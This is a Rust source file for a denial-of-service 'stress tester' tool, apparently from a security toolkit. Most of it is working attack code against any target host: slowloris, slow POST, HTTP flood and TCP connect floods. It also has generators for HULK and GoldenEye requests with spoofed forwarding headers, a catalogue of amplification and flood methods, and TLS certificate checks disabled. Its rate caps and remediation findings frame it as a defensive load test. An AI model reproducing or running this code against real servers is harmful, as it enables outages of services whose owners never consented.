use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, AtomicBool, Ordering};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DdosTesterConfig {
    pub target: String,
    pub port: u16,
    pub attack_type: String,
    pub duration_secs: u64,
    pub concurrent_connections: usize,
    pub requests_per_second: usize,
    pub timeout: u64,
    pub use_https: bool,
}

impl Default for DdosTesterConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            port: 80,
            attack_type: "slowloris".to_string(),
            duration_secs: 10,
            concurrent_connections: 100,
            requests_per_second: 50,
            timeout: 5,
            use_https: false,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DdosAttackMethod {
    pub name: &'static str,
    pub category: &'static str,
    pub description: &'static str,
    pub protocol: &'static str,
    pub severity: &'static str,
    pub default_port: u16,
    pub requires_root: bool,
}

pub const DDOS_ATTACK_METHODS: &[DdosAttackMethod] = &[
    DdosAttackMethod { name: "slowloris", category: "Layer 7", description: "Keep-alive connections with partial headers", protocol: "HTTP", severity: "medium", default_port: 80, requires_root: false },
    DdosAttackMethod { name: "http_flood", category: "Layer 7", description: "High volume HTTP GET/POST requests", protocol: "HTTP", severity: "high", default_port: 80, requires_root: false },
    DdosAttackMethod { name: "slow_post", category: "Layer 7", description: "Slow POST body transmission", protocol: "HTTP", severity: "medium", default_port: 80, requires_root: false },
    DdosAttackMethod { name: "slow_read", category: "Layer 7", description: "Slow reading of server responses", protocol: "HTTP", severity: "medium", default_port: 80, requires_root: false },
    DdosAttackMethod { name: "header_flood", category: "Layer 7", description: "Flood with malformed HTTP headers", protocol: "HTTP", severity: "medium", default_port: 80, requires_root: false },
    DdosAttackMethod { name: "cache_bust", category: "Layer 7", description: "Bypass caching with random query params", protocol: "HTTP", severity: "medium", default_port: 80, requires_root: false },
    DdosAttackMethod { name: "syn_flood", category: "Layer 4", description: "TCP SYN flood - half-open connections", protocol: "TCP", severity: "critical", default_port: 80, requires_root: true },
    DdosAttackMethod { name: "udp_flood", category: "Layer 4", description: "UDP packet flood to random ports", protocol: "UDP", severity: "high", default_port: 0, requires_root: true },
    DdosAttackMethod { name: "ack_flood", category: "Layer 4", description: "TCP ACK packet flood", protocol: "TCP", severity: "high", default_port: 80, requires_root: true },
    DdosAttackMethod { name: "icmp_flood", category: "Layer 3", description: "ICMP echo request flood (Ping flood)", protocol: "ICMP", severity: "high", default_port: 0, requires_root: true },
    DdosAttackMethod { name: "pod", category: "Layer 3", description: "Ping of Death - oversized ICMP packets", protocol: "ICMP", severity: "critical", default_port: 0, requires_root: true },
    DdosAttackMethod { name: "smurf", category: "Layer 3", description: "ICMP broadcast amplification", protocol: "ICMP", severity: "critical", default_port: 0, requires_root: true },
    DdosAttackMethod { name: "dns_amplification", category: "Layer 3", description: "DNS query amplification attack", protocol: "UDP", severity: "critical", default_port: 53, requires_root: true },
    DdosAttackMethod { name: "ntp_amplification", category: "Layer 3", description: "NTP monlist amplification", protocol: "UDP", severity: "critical", default_port: 123, requires_root: true },
    DdosAttackMethod { name: "ssdp_amplification", category: "Layer 3", description: "SSDP/UPnP amplification", protocol: "UDP", severity: "critical", default_port: 1900, requires_root: true },
    DdosAttackMethod { name: "memcached_amplification", category: "Layer 3", description: "Memcached amplification attack", protocol: "UDP", severity: "critical", default_port: 11211, requires_root: true },
    DdosAttackMethod { name: "http_slowloris_https", category: "Layer 7", description: "Slowloris over HTTPS", protocol: "HTTPS", severity: "medium", default_port: 443, requires_root: false },
    DdosAttackMethod { name: "rudy", category: "Layer 7", description: "R-U-Dead-Yet slow POST attack", protocol: "HTTP", severity: "medium", default_port: 80, requires_root: false },
    DdosAttackMethod { name: "goldeneye", category: "Layer 7", description: "HTTP Keep-Alive + NoCache flood", protocol: "HTTP", severity: "high", default_port: 80, requires_root: false },
    DdosAttackMethod { name: "hulk", category: "Layer 7", description: "HTTP Unbearable Load King - randomized URLs", protocol: "HTTP", severity: "high", default_port: 80, requires_root: false },
];

pub fn generate_http_flood_request(host: &str, path: &str, method: &str) -> String {
    let random_param = format!("{}_{}", 
        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis(),
        rand::random::<u32>()
    );
    let cache_buster = format!("{}{}nocache={}", path, if path.contains('?') { "&" } else { "?" }, random_param);
    
    match method {
        "POST" => format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n",
            cache_buster, host
        ),
        _ => format!(
            "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n",
            cache_buster, host
        ),
    }
}

pub fn generate_slowloris_headers() -> Vec<String> {
    let headers = vec![
        "GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n".to_string(),
        "X-a: {}\r\n".replace("{}", &rand::random::<u32>().to_string()),
    ];
    headers
}

pub fn generate_slow_post_request(host: &str, content_length: usize) -> String {
    format!(
        "POST / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n",
        host, content_length
    )
}

pub fn generate_hulk_request(host: &str) -> String {
    let paths = ["/", "/index.html", "/search", "/api/v1/status", "/login", "/about", "/contact", "/products"];
    let path = paths[rand::random::<usize>() % paths.len()];
    let random_suffix = format!("{}{:x}", 
        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos(),
        rand::random::<u64>()
    );
    let full_path = format!("{}{}q={}", path, if path.contains('?') { "&" } else { "?" }, random_suffix);
    
    let referers = ["https://www.google.com/", "https://www.bing.com/", "https://twitter.com/", "https://www.facebook.com/"];
    let referer = referers[rand::random::<usize>() % referers.len()];
    
    format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: {}\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n",
        full_path, host, referer
    )
}

pub fn generate_goldeneye_request(host: &str) -> String {
    let random_val = rand::random::<u32>();
    format!(
        "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nKeep-Alive: keep-alive\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nX-Forwarded-For: 127.0.0.{}\r\nX-Real-IP: 10.0.0.{}\r\n\r\n",
        host, random_val % 255, random_val % 255
    )
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DdosTesterResult {
    pub success: bool,
    pub target: String,
    pub attack_type: String,
    pub total_requests: u64,
    pub successful_requests: u64,
    pub failed_requests: u64,
    pub duration_secs: f64,
    pub requests_per_second: f64,
    pub connections_opened: u64,
    pub connections_maintained: u64,
    pub target_response_time_ms: Vec<u64>,
    pub response_status_codes: HashMap<String, u64>,
    pub response_time_percentiles: ResponseTimePercentiles,
    pub findings: Vec<DdosFinding>,
    pub summary: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResponseTimePercentiles {
    pub p50: u64,
    pub p75: u64,
    pub p90: u64,
    pub p95: u64,
    pub p99: u64,
    pub min: u64,
    pub max: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DdosFinding {
    pub severity: String,
    pub category: String,
    pub description: String,
    pub recommendation: String,
}

pub struct DdosTesterTool;

impl DdosTesterTool {
    const MAX_RESPONSE_TIMES: usize = 10000;

    async fn push_response_time(times: &Arc<tokio::sync::Mutex<Vec<u64>>>, value: u64) {
        let mut guard = times.lock().await;
        if guard.len() < Self::MAX_RESPONSE_TIMES {
            guard.push(value);
        } else {
            let idx = (guard.len() as f64 * rand::random::<f64>()) as usize;
            if idx < guard.len() {
                guard[idx] = value;
            }
        }
    }

    pub async fn test(config: &DdosTesterConfig) -> std::result::Result<DdosTesterResult, String> {
        if config.target.is_empty() {
            return Err("Target address is required".to_string());
        }

        if config.port == 0 {
            return Err("Port must be between 1 and 65535".to_string());
        }

        if config.duration_secs == 0 {
            return Err("Duration must be at least 1 second".to_string());
        }

        if config.duration_secs > 120 {
            return Err("Duration cannot exceed 120 seconds".to_string());
        }

        if config.concurrent_connections == 0 {
            return Err("Concurrent connections must be at least 1".to_string());
        }

        if config.concurrent_connections > 1000 {
            return Err("Concurrent connections cannot exceed 1000".to_string());
        }

        if config.requests_per_second > 2000 {
            return Err("Requests per second cannot exceed 2000".to_string());
        }

        if config.timeout == 0 {
            return Err("Timeout must be at least 1 second".to_string());
        }

        let target = config.target.trim().to_string();
        let start_time = std::time::Instant::now();

        let total_requests = Arc::new(AtomicU64::new(0));
        let successful_requests = Arc::new(AtomicU64::new(0));
        let failed_requests = Arc::new(AtomicU64::new(0));
        let connections_opened = Arc::new(AtomicU64::new(0));
        let connections_maintained = Arc::new(AtomicU64::new(0));
        let cancel_flag = Arc::new(AtomicBool::new(false));
        let response_times = Arc::new(tokio::sync::Mutex::new(Vec::<u64>::new()));
        let status_codes = Arc::new(tokio::sync::Mutex::new(HashMap::<String, u64>::new()));

        let deadline = tokio::time::Instant::now() + Duration::from_secs(config.duration_secs);

        match config.attack_type.to_lowercase().as_str() {
            "slowloris" => {
                Self::slowloris_attack(
                    &target,
                    config.port,
                    config.concurrent_connections,
                    config.use_https,
                    deadline,
                    &total_requests,
                    &successful_requests,
                    &failed_requests,
                    &connections_opened,
                    &connections_maintained,
                    &cancel_flag,
                    &response_times,
                    &status_codes,
                    config.timeout,
                ).await;
            }
            "http_flood" => {
                Self::http_flood_attack(
                    &target,
                    config.port,
                    config.concurrent_connections,
                    config.requests_per_second,
                    config.use_https,
                    deadline,
                    &total_requests,
                    &successful_requests,
                    &failed_requests,
                    &connections_opened,
                    &response_times,
                    &status_codes,
                    config.timeout,
                ).await;
            }
            "slow_post" => {
                Self::slow_post_attack(
                    &target,
                    config.port,
                    config.concurrent_connections,
                    config.use_https,
                    deadline,
                    &total_requests,
                    &successful_requests,
                    &failed_requests,
                    &connections_opened,
                    &connections_maintained,
                    &cancel_flag,
                    &response_times,
                    &status_codes,
                    config.timeout,
                ).await;
            }
            "tcp_connect" => {
                Self::tcp_connect_attack(
                    &target,
                    config.port,
                    config.concurrent_connections,
                    config.requests_per_second,
                    deadline,
                    &total_requests,
                    &successful_requests,
                    &failed_requests,
                    &connections_opened,
                    &response_times,
                    config.timeout,
                ).await;
            }
            _ => {
                return Err(format!(
                    "Unsupported attack type: {}. Supported: slowloris, http_flood, slow_post, tcp_connect",
                    config.attack_type
                ));
            }
        }

        let elapsed = start_time.elapsed().as_secs_f64();
        let total_req = total_requests.load(Ordering::Relaxed);
        let success_req = successful_requests.load(Ordering::Relaxed);
        let failed_req = failed_requests.load(Ordering::Relaxed);
        let conns_opened = connections_opened.load(Ordering::Relaxed);
        let conns_maintained = connections_maintained.load(Ordering::Relaxed);
        let rps = if elapsed > 0.0 { total_req as f64 / elapsed } else { 0.0 };

        let resp_times = response_times.lock().await.clone();
        let status_codes_map = status_codes.lock().await.clone();
        let percentiles = Self::calculate_percentiles(&resp_times);
        let mut findings = Vec::new();

        let avg_response = if !resp_times.is_empty() {
            resp_times.iter().sum::<u64>() / resp_times.len() as u64
        } else {
            0
        };

        let error_rate = if total_req > 0 {
            (failed_req as f64 / total_req as f64) * 100.0
        } else {
            0.0
        };

        if avg_response > 5000 {
            findings.push(DdosFinding {
                severity: "high".to_string(),
                category: "availability".to_string(),
                description: format!("Target average response time {}ms under load indicates DoS risk", avg_response),
                recommendation: "Increase server resources, configure rate limiting and connection timeouts".to_string(),
            });
        } else if avg_response > 2000 {
            findings.push(DdosFinding {
                severity: "medium".to_string(),
                category: "availability".to_string(),
                description: format!("Target response time elevated to {}ms under load", avg_response),
                recommendation: "Optimize server performance, consider adding load balancing".to_string(),
            });
        } else if avg_response > 500 {
            findings.push(DdosFinding {
                severity: "low".to_string(),
                category: "availability".to_string(),
                description: format!("Target response time {}ms under load, slightly elevated", avg_response),
                recommendation: "Monitor performance under normal conditions for comparison".to_string(),
            });
        }

        if total_req > 0 && failed_req > success_req / 2 {
            findings.push(DdosFinding {
                severity: "high".to_string(),
                category: "stability".to_string(),
                description: format!("Request failure rate {:.1}%, server may not handle this load", error_rate),
                recommendation: "Configure connection limits, rate limiting and WAF protection".to_string(),
            });
        } else if total_req > 0 && error_rate > 30.0 {
            findings.push(DdosFinding {
                severity: "medium".to_string(),
                category: "stability".to_string(),
                description: format!("Request failure rate {:.1}%, server showing signs of stress", error_rate),
                recommendation: "Review server capacity and optimize resource handling".to_string(),
            });
        }

        if conns_maintained > config.concurrent_connections as u64 / 2 {
            findings.push(DdosFinding {
                severity: "medium".to_string(),
                category: "slow_attack".to_string(),
                description: format!("Successfully maintained {} slow connections, server vulnerable to SlowLoris-type attacks", conns_maintained),
                recommendation: "Configure connection timeouts and maximum keep-alive connection limits".to_string(),
            });
        }

        if percentiles.p95 > 10000 {
            findings.push(DdosFinding {
                severity: "medium".to_string(),
                category: "performance".to_string(),
                description: format!("P95 response time is {}ms, indicating inconsistent performance under load", percentiles.p95),
                recommendation: "Investigate performance bottlenecks, optimize database queries and caching".to_string(),
            });
        } else if percentiles.p95 > 5000 {
            findings.push(DdosFinding {
                severity: "low".to_string(),
                category: "performance".to_string(),
                description: format!("P95 response time is {}ms, some requests experiencing delays", percentiles.p95),
                recommendation: "Monitor tail latency and optimize slow endpoints".to_string(),
            });
        }

        if let Some(&timeout_count) = status_codes_map.get("timeout") {
            if timeout_count > total_req / 4 {
                findings.push(DdosFinding {
                    severity: "high".to_string(),
                    category: "timeout".to_string(),
                    description: format!("{} requests timed out ({:.1}%), server may be overwhelmed", timeout_count, (timeout_count as f64 / total_req as f64) * 100.0),
                    recommendation: "Increase server capacity or reduce incoming request rate".to_string(),
                });
            }
        }

        if let Some(&five_xx_count) = status_codes_map.get("500").or(status_codes_map.get("502")).or(status_codes_map.get("503")) {
            if five_xx_count > total_req / 10 {
                findings.push(DdosFinding {
                    severity: "high".to_string(),
                    category: "server_error".to_string(),
                    description: format!("{} server errors (5xx) detected, server struggling under load", five_xx_count),
                    recommendation: "Review server error logs and increase capacity or fix application errors".to_string(),
                });
            }
        }

        if findings.is_empty() {
            findings.push(DdosFinding {
                severity: "info".to_string(),
                category: "availability".to_string(),
                description: format!("Target stable under {} concurrent connections, avg response {}ms", config.concurrent_connections, avg_response),
                recommendation: "Recommend regular stress testing to monitor service capacity".to_string(),
            });
        }

        let summary = format!(
            "Stress Test | Type: {} | Target: {}:{} | Duration: {:.1}s | Requests: {} (Success:{} Fail:{}) | RPS: {:.1} | Avg Response: {}ms",
            config.attack_type, target, config.port, elapsed, total_req, success_req, failed_req, rps, avg_response
        );

        Ok(DdosTesterResult {
            success: true,
            target,
            attack_type: config.attack_type.clone(),
            total_requests: total_req,
            successful_requests: success_req,
            failed_requests: failed_req,
            duration_secs: elapsed,
            requests_per_second: rps,
            connections_opened: conns_opened,
            connections_maintained: conns_maintained,
            target_response_time_ms: resp_times,
            response_status_codes: status_codes_map,
            response_time_percentiles: percentiles,
            findings,
            summary,
        })
    }

    fn calculate_percentiles(times: &[u64]) -> ResponseTimePercentiles {
        if times.is_empty() {
            return ResponseTimePercentiles { p50: 0, p75: 0, p90: 0, p95: 0, p99: 0, min: 0, max: 0 };
        }
        let mut sorted = times.to_vec();
        sorted.sort_unstable();
        let len = sorted.len();
        let percentile = |p: f64| -> u64 {
            let idx = ((p / 100.0) * (len as f64 - 1.0)).round() as usize;
            sorted[idx.min(len - 1)]
        };
        ResponseTimePercentiles {
            p50: percentile(50.0),
            p75: percentile(75.0),
            p90: percentile(90.0),
            p95: percentile(95.0),
            p99: percentile(99.0),
            min: sorted[0],
            max: sorted[len - 1],
        }
    }

    async fn parse_http_status(data: &[u8], status_codes: &Arc<tokio::sync::Mutex<HashMap<String, u64>>>) {
        let response = String::from_utf8_lossy(data);
        if let Some(line) = response.lines().next() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                let code = parts[1].to_string();
                if code.chars().all(|c| c.is_ascii_digit()) {
                    let mut map = status_codes.lock().await;
                    *map.entry(code).or_insert(0) += 1;
                }
            }
        }
    }

    async fn slowloris_attack(
        target: &str,
        port: u16,
        concurrent: usize,
        use_https: bool,
        deadline: tokio::time::Instant,
        total_requests: &Arc<AtomicU64>,
        successful_requests: &Arc<AtomicU64>,
        failed_requests: &Arc<AtomicU64>,
        connections_opened: &Arc<AtomicU64>,
        connections_maintained: &Arc<AtomicU64>,
        cancel_flag: &Arc<AtomicBool>,
        response_times: &Arc<tokio::sync::Mutex<Vec<u64>>>,
        status_codes: &Arc<tokio::sync::Mutex<HashMap<String, u64>>>,
        timeout_secs: u64,
    ) {
        let addr = format!("{}:{}", target, port);
        let mut handles = Vec::new();

        for i in 0..concurrent {
            let addr = addr.clone();
            let target = target.to_string();
            let total_requests = total_requests.clone();
            let successful_requests = successful_requests.clone();
            let failed_requests = failed_requests.clone();
            let connections_opened = connections_opened.clone();
            let connections_maintained = connections_maintained.clone();
            let cancel_flag = cancel_flag.clone();
            let response_times = response_times.clone();
            let status_codes = status_codes.clone();

            let handle = tokio::spawn(async move {
                let start = std::time::Instant::now();
                match timeout(Duration::from_secs(timeout_secs), TcpStream::connect(&addr)).await {
                    Ok(Ok(tcp_stream)) => {
                        connections_opened.fetch_add(1, Ordering::Relaxed);
                        total_requests.fetch_add(1, Ordering::Relaxed);

                        let mut stream: Box<dyn tokio::io::AsyncWrite + Unpin + Send> = if use_https {
                            let tls_connector = tokio_native_tls::TlsConnector::from(
                                native_tls::TlsConnector::builder()
                                    .danger_accept_invalid_certs(true)
                                    .build()
                                    .unwrap()
                            );
                            match tls_connector.connect(&target, tcp_stream).await {
                                Ok(tls_stream) => Box::new(tls_stream),
                                Err(_) => {
                                    failed_requests.fetch_add(1, Ordering::Relaxed);
                                    return;
                                }
                            }
                        } else {
                            Box::new(tcp_stream)
                        };

                        let request = format!(
                            "GET /?{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: BiosphereStressTest/1.0\r\n",
                            i, target
                        );

                        if stream.write_all(request.as_bytes()).await.is_ok() {
                            successful_requests.fetch_add(1, Ordering::Relaxed);
                        }

                        let headers = [
                            "X-Custom-Header-A: keepalive\r\n",
                            "X-Custom-Header-B: keepalive\r\n",
                            "X-Custom-Header-C: keepalive\r\n",
                        ];

                        let mut header_idx = 0;
                        while tokio::time::Instant::now() < deadline && !cancel_flag.load(Ordering::Relaxed) {
                            tokio::time::sleep(Duration::from_millis(500 + (i % 5) as u64 * 100)).await;

                            let header = headers[header_idx % headers.len()];
                            match stream.write_all(header.as_bytes()).await {
                                Ok(_) => {
                                    connections_maintained.fetch_add(1, Ordering::Relaxed);
                                }
                                Err(_) => {
                                    break;
                                }
                            }
                            header_idx += 1;
                        }

                        let elapsed = start.elapsed().as_millis() as u64;
                        Self::push_response_time(&response_times, elapsed).await;
                    }
                    Ok(Err(_)) | Err(_) => {
                        failed_requests.fetch_add(1, Ordering::Relaxed);
                        total_requests.fetch_add(1, Ordering::Relaxed);
                        let mut map = status_codes.lock().await;
                        *map.entry("timeout".to_string()).or_insert(0) += 1;
                    }
                }
            });
            handles.push(handle);
        }

        for handle in handles {
            let _ = handle.await;
        }
    }

    async fn http_flood_attack(
        target: &str,
        port: u16,
        concurrent: usize,
        rps: usize,
        use_https: bool,
        deadline: tokio::time::Instant,
        total_requests: &Arc<AtomicU64>,
        successful_requests: &Arc<AtomicU64>,
        failed_requests: &Arc<AtomicU64>,
        connections_opened: &Arc<AtomicU64>,
        response_times: &Arc<tokio::sync::Mutex<Vec<u64>>>,
        status_codes: &Arc<tokio::sync::Mutex<HashMap<String, u64>>>,
        timeout_secs: u64,
    ) {
        let addr = format!("{}:{}", target, port);
        let semaphore = Arc::new(tokio::sync::Semaphore::new(concurrent));
        let interval = Duration::from_millis(1000 / rps.max(1) as u64);

        let mut _request_id = 0u64;
        let mut handles = Vec::new();

        while tokio::time::Instant::now() < deadline {
            let permit = semaphore.clone().acquire_owned().await.unwrap();
            let addr = addr.clone();
            let target = target.to_string();
            let total_requests = total_requests.clone();
            let successful_requests = successful_requests.clone();
            let failed_requests = failed_requests.clone();
            let connections_opened = connections_opened.clone();
            let response_times = response_times.clone();
            let status_codes = status_codes.clone();
            let current_request_id = _request_id;

            let handle = tokio::spawn(async move {
                let start = std::time::Instant::now();
                let request = format!(
                    "GET /?req={} HTTP/1.1\r\nHost: {}\r\nUser-Agent: BiosphereStressTest/1.0\r\nConnection: close\r\n\r\n",
                    current_request_id, target
                );

                total_requests.fetch_add(1, Ordering::Relaxed);

                match timeout(Duration::from_secs(timeout_secs), TcpStream::connect(&addr)).await {
                    Ok(Ok(tcp_stream)) => {
                        connections_opened.fetch_add(1, Ordering::Relaxed);

                        if use_https {
                            let tls_connector = tokio_native_tls::TlsConnector::from(
                                native_tls::TlsConnector::builder()
                                    .danger_accept_invalid_certs(true)
                                    .build()
                                    .unwrap()
                            );
                            match tls_connector.connect(&target, tcp_stream).await {
                                Ok(mut tls_stream) => {
                                    if tls_stream.write_all(request.as_bytes()).await.is_ok() {
                                        let mut buf = vec![0u8; 4096];
                                        match tls_stream.read(&mut buf).await {
                                            Ok(n) => {
                                                if n > 0 {
                                                    Self::parse_http_status(&buf[..n], &status_codes).await;
                                                }
                                                successful_requests.fetch_add(1, Ordering::Relaxed);
                                            }
                                            Err(_) => {
                                                failed_requests.fetch_add(1, Ordering::Relaxed);
                                            }
                                        }
                                    } else {
                                        failed_requests.fetch_add(1, Ordering::Relaxed);
                                    }
                                }
                                Err(_) => {
                                    failed_requests.fetch_add(1, Ordering::Relaxed);
                                    let mut map = status_codes.lock().await;
                                    *map.entry("tls_error".to_string()).or_insert(0) += 1;
                                }
                            }
                        } else {
                            let (mut reader, mut writer) = tokio::io::split(tcp_stream);
                            if writer.write_all(request.as_bytes()).await.is_ok() {
                                let mut buf = vec![0u8; 4096];
                                match reader.read(&mut buf).await {
                                    Ok(n) => {
                                        if n > 0 {
                                            Self::parse_http_status(&buf[..n], &status_codes).await;
                                        }
                                        successful_requests.fetch_add(1, Ordering::Relaxed);
                                    }
                                    Err(_) => {
                                        failed_requests.fetch_add(1, Ordering::Relaxed);
                                    }
                                }
                            } else {
                                failed_requests.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                    }
                    Ok(Err(_)) | Err(_) => {
                        failed_requests.fetch_add(1, Ordering::Relaxed);
                        let mut map = status_codes.lock().await;
                        *map.entry("timeout".to_string()).or_insert(0) += 1;
                    }
                }

                let elapsed = start.elapsed().as_millis() as u64;
                Self::push_response_time(&response_times, elapsed).await;
                drop(permit);
            });

            handles.push(handle);
            _request_id += 1;

            if handles.len() > 5000 {
                let drained: Vec<_> = handles.drain(..handles.len() / 2).collect();
                for h in drained {
                    let _ = h.await;
                }
            }

            tokio::time::sleep(interval).await;
        }

        for handle in handles {
            let _ = handle.await;
        }
    }

    async fn slow_post_attack(
        target: &str,
        port: u16,
        concurrent: usize,
        use_https: bool,
        deadline: tokio::time::Instant,
        total_requests: &Arc<AtomicU64>,
        successful_requests: &Arc<AtomicU64>,
        failed_requests: &Arc<AtomicU64>,
        connections_opened: &Arc<AtomicU64>,
        connections_maintained: &Arc<AtomicU64>,
        cancel_flag: &Arc<AtomicBool>,
        response_times: &Arc<tokio::sync::Mutex<Vec<u64>>>,
        status_codes: &Arc<tokio::sync::Mutex<HashMap<String, u64>>>,
        timeout_secs: u64,
    ) {
        let addr = format!("{}:{}", target, port);
        let mut handles = Vec::new();

        for i in 0..concurrent {
            let addr = addr.clone();
            let target = target.to_string();
            let total_requests = total_requests.clone();
            let successful_requests = successful_requests.clone();
            let failed_requests = failed_requests.clone();
            let connections_opened = connections_opened.clone();
            let connections_maintained = connections_maintained.clone();
            let cancel_flag = cancel_flag.clone();
            let response_times = response_times.clone();
            let status_codes = status_codes.clone();

            let handle = tokio::spawn(async move {
                let start = std::time::Instant::now();
                let content_length = 100000 + (i as u64 * 1000);

                match timeout(Duration::from_secs(timeout_secs), TcpStream::connect(&addr)).await {
                    Ok(Ok(tcp_stream)) => {
                        connections_opened.fetch_add(1, Ordering::Relaxed);
                        total_requests.fetch_add(1, Ordering::Relaxed);

                        let mut stream: Box<dyn tokio::io::AsyncWrite + Unpin + Send> = if use_https {
                            let tls_connector = tokio_native_tls::TlsConnector::from(
                                native_tls::TlsConnector::builder()
                                    .danger_accept_invalid_certs(true)
                                    .build()
                                    .unwrap()
                            );
                            match tls_connector.connect(&target, tcp_stream).await {
                                Ok(tls_stream) => Box::new(tls_stream),
                                Err(_) => {
                                    failed_requests.fetch_add(1, Ordering::Relaxed);
                                    return;
                                }
                            }
                        } else {
                            Box::new(tcp_stream)
                        };

                        let request = format!(
                            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n",
                            target, content_length
                        );

                        if stream.write_all(request.as_bytes()).await.is_ok() {
                            successful_requests.fetch_add(1, Ordering::Relaxed);
                        }

                        let mut bytes_sent = 0u64;
                        while tokio::time::Instant::now() < deadline && !cancel_flag.load(Ordering::Relaxed) && bytes_sent < content_length {
                            tokio::time::sleep(Duration::from_millis(1000 + (i % 3) as u64 * 500)).await;

                            let chunk = "A=1&";
                            match stream.write_all(chunk.as_bytes()).await {
                                Ok(_) => {
                                    bytes_sent += chunk.len() as u64;
                                    connections_maintained.fetch_add(1, Ordering::Relaxed);
                                }
                                Err(_) => {
                                    break;
                                }
                            }
                        }

                        let elapsed = start.elapsed().as_millis() as u64;
                        Self::push_response_time(&response_times, elapsed).await;
                    }
                    Ok(Err(_)) | Err(_) => {
                        failed_requests.fetch_add(1, Ordering::Relaxed);
                        total_requests.fetch_add(1, Ordering::Relaxed);
                        let mut map = status_codes.lock().await;
                        *map.entry("timeout".to_string()).or_insert(0) += 1;
                    }
                }
            });
            handles.push(handle);
        }

        for handle in handles {
            let _ = handle.await;
        }
    }

    async fn tcp_connect_attack(
        target: &str,
        port: u16,
        concurrent: usize,
        rps: usize,
        deadline: tokio::time::Instant,
        total_requests: &Arc<AtomicU64>,
        successful_requests: &Arc<AtomicU64>,
        failed_requests: &Arc<AtomicU64>,
        connections_opened: &Arc<AtomicU64>,
        response_times: &Arc<tokio::sync::Mutex<Vec<u64>>>,
        timeout_secs: u64,
    ) {
        let addr = format!("{}:{}", target, port);
        let semaphore = Arc::new(tokio::sync::Semaphore::new(concurrent));
        let interval = Duration::from_millis(1000 / rps.max(1) as u64);

        let mut _request_id = 0u64;
        let mut handles = Vec::new();

        while tokio::time::Instant::now() < deadline {
            let permit = semaphore.clone().acquire_owned().await.unwrap();
            let addr = addr.clone();
            let total_requests = total_requests.clone();
            let successful_requests = successful_requests.clone();
            let failed_requests = failed_requests.clone();
            let connections_opened = connections_opened.clone();
            let response_times = response_times.clone();

            let handle = tokio::spawn(async move {
                let start = std::time::Instant::now();
                total_requests.fetch_add(1, Ordering::Relaxed);

                match timeout(Duration::from_secs(timeout_secs), TcpStream::connect(&addr)).await {
                    Ok(Ok(_stream)) => {
                        connections_opened.fetch_add(1, Ordering::Relaxed);
                        successful_requests.fetch_add(1, Ordering::Relaxed);
                    }
                    Ok(Err(_)) | Err(_) => {
                        failed_requests.fetch_add(1, Ordering::Relaxed);
                    }
                }

                let elapsed = start.elapsed().as_millis() as u64;
                Self::push_response_time(&response_times, elapsed).await;
                drop(permit);
            });

            handles.push(handle);
            _request_id += 1;

            if handles.len() > 5000 {
                let drained: Vec<_> = handles.drain(..handles.len() / 2).collect();
                for h in drained {
                    let _ = h.await;
                }
            }

            tokio::time::sleep(interval).await;
        }

        for handle in handles {
            let _ = handle.await;
        }
    }
}
